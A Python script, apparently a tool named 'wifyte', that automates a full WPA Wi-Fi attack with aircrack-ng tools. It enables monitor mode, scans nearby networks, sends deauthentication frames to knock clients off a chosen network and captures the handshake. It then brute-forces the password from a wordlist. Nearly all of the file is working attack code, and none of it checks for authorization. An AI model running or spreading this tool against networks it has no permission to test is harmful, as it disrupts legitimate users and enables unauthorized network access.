import os
import subprocess
import time
import sys
from colorama import Fore, Style, init
from typing import List, Dict
from collections import namedtuple
import logging

# Initialize colorama
init(autoreset=True)

# Initialize logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

# Configuration
WORDLIST = os.getenv("WIFYTE_WORDLIST", "wifyte.txt")  # Path to the wordlist file
TIMEOUT = 180  # Timeout for capturing handshake (3 minutes)
SCAN_DURATION = 12  # Total scanning duration in seconds
SCAN_INTERVAL = 4  # Interval between scans in seconds

Network = namedtuple("Network", ["BSSID", "Channel", "SSID", "Signal", "Clients"])


def detect_wifi_adapter() -> str:
    logging.info("Detecting Wi-Fi adapter...")
    try:
        result = subprocess.run(
            ["iwconfig"], capture_output=True, text=True, timeout=10
        )
        adapters = [
            line.split()[0]
            for line in result.stdout.split("\n")
            if "IEEE 802.11" in line
        ]
        if not adapters:
            logging.error("No Wi-Fi adapter found that supports monitor mode.")
            sys.exit(1)
        logging.info(f"Supported Wi-Fi adapters: {', '.join(adapters)}")
        return adapters[0]  # Select the first adapter
    except subprocess.TimeoutExpired:
        logging.error("Command timed out.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Failed to detect Wi-Fi adapter: {e}")
        sys.exit(1)


def enable_monitor_mode(interface: str) -> str:
    logging.info(f"Enabling monitor mode on {interface}...")
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        subprocess.run(["airmon-ng", "start", interface], check=True)
        return f"{interface}mon"
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to enable monitor mode: {e}")
        sys.exit(1)


def scan_networks(interface: str) -> List[Network]:
    networks = []
    logging.info("Scanning for available Wi-Fi networks... This will take 12 seconds.")

    start_time = time.time()
    while time.time() - start_time < SCAN_DURATION:
        try:
            process = subprocess.Popen(
                ["airodump-ng", interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            time.sleep(SCAN_INTERVAL)
            process.terminate()

            output = process.stdout.read()
            lines = output.split("\n")
            temp_networks = []
            bssid_index = None
            ssid_index = None
            channel_index = None
            signal_index = None
            clients_index = None

            for line in lines:
                if "BSSID" in line:
                    headers = line.split()
                    try:
                        bssid_index = headers.index("BSSID")
                        ssid_index = headers.index("ESSID")
                        channel_index = headers.index("CH")
                        signal_index = headers.index("PWR")
                        clients_index = (
                            headers.index("STATION") if "STATION" in headers else None
                        )
                    except ValueError:
                        continue
                    continue

                if len(line.strip()) > 0 and "Station" not in line:
                    parts = line.split()
                    if (
                        len(parts)
                        < max(bssid_index, ssid_index, channel_index, signal_index) + 1
                    ):
                        continue
                    bssid = parts[bssid_index]
                    channel = parts[channel_index]
                    ssid = parts[ssid_index] if len(parts) > ssid_index else "<Hidden>"
                    signal = int(parts[signal_index])  # Signal strength in dBm
                    clients = (
                        parts[clients_index]
                        if clients_index and len(parts) > clients_index
                        else "0"
                    )
                    temp_networks.append(Network(bssid, channel, ssid, signal, clients))
            networks.clear()
            networks.extend(temp_networks)

        except Exception as e:
            logging.error(f"Failed to scan networks: {e}")

    logging.info("Available Wi-Fi networks:")
    if not networks:
        logging.warning("No networks detected. Please try again.")
        sys.exit(1)

    for i, network in enumerate(networks):
        signal_strength = abs(network.Signal)
        if signal_strength <= 50:
            color = Fore.GREEN  # Strong signal
        elif 50 < signal_strength <= 70:
            color = Fore.YELLOW  # Moderate signal
        else:
            color = Fore.RED  # Weak signal
        print(
            f"{i + 1}. {color}SSID: {network.SSID}, BSSID: {network.BSSID}, Channel: {network.Channel}, Signal: {network.Signal} dBm, Clients: {network.Clients}"
        )

    return networks


def deauth_attack(interface: str, bssid: str, channel: str):
    logging.info(f"Performing deauthentication attack on BSSID: {bssid}...")
    try:
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
            check=True,
        )
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to perform deauthentication attack: {e}")


def capture_handshake(interface: str, bssid: str, channel: str) -> str:
    logging.info(f"Attempting to capture handshake from BSSID: {bssid}...")
    cap_file = "handshake.cap"
    start_time = time.time()

    while time.time() - start_time < TIMEOUT:
        process = subprocess.Popen(
            [
                "airodump-ng",
                "--bssid",
                bssid,
                "--channel",
                channel,
                "--write",
                "handshake",
                interface,
            ]
        )
        time.sleep(10)
        process.terminate()

        if os.path.exists(cap_file):
            logging.info("Handshake successfully captured!")
            return cap_file

        deauth_attack(interface, bssid, channel)

    logging.error("Failed to capture handshake after 3 minutes.")
    return None


def crack_handshake(cap_file: str, wordlist: str, target_bssid: str) -> bool:
    logging.info(f"Starting cracking process using wordlist: {wordlist}...")
    try:
        with open(wordlist, "r", encoding="latin-1") as f:
            passwords = f.readlines()

        total_passwords = len(passwords)
        logging.info(f"Total passwords to test: {total_passwords}")

        for i, password in enumerate(passwords, start=1):
            password = password.strip()
            result = subprocess.run(
                [
                    "aircrack-ng",
                    "-w",
                    "-",  # Read password from stdin
                    "-b",
                    target_bssid,  # Use the selected BSSID
                    cap_file,
                ],
                input=password.encode(),
                capture_output=True,
                text=True,
            )

            if "KEY FOUND!" in result.stdout:
                logging.info(f"Password successfully cracked: {password}")
                return True

        logging.warning("Password not found.")
        return False
    except Exception as e:
        logging.error(f"Failed to crack handshake: {e}")
        return False


def disable_monitor_mode(interface: str):
    logging.info(f"Disabling monitor mode on {interface}...")
    try:
        subprocess.run(["airmon-ng", "stop", interface], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to disable monitor mode: {e}")


def main():
    adapter = detect_wifi_adapter()
    monitor_interface = enable_monitor_mode(adapter)

    try:
        networks = scan_networks(monitor_interface)

        choice = int(input("Enter the number of the network you want to test: ")) - 1
        if choice < 0 or choice >= len(networks):
            logging.error("Invalid selection.")
            sys.exit(1)

        target = networks[choice]
        TARGET_BSSID = target.BSSID
        logging.info(
            f"Target selected: SSID: {target.SSID}, BSSID: {TARGET_BSSID}, Channel: {target.Channel}"
        )

        cap_file = capture_handshake(monitor_interface, TARGET_BSSID, target.Channel)
        if not cap_file:
            logging.error("Test failed. No handshake captured.")
            sys.exit(1)

        success = crack_handshake(cap_file, WORDLIST, TARGET_BSSID)
        if not success:
            logging.error("Cracking failed. Password not found.")

    finally:
        choice = input("Do you want to disable monitor mode? (y/n): ").lower()
        if choice == "y":
            disable_monitor_mode(monitor_interface)
        logging.info("Program finished.")


if __name__ == "__main__":
    main()
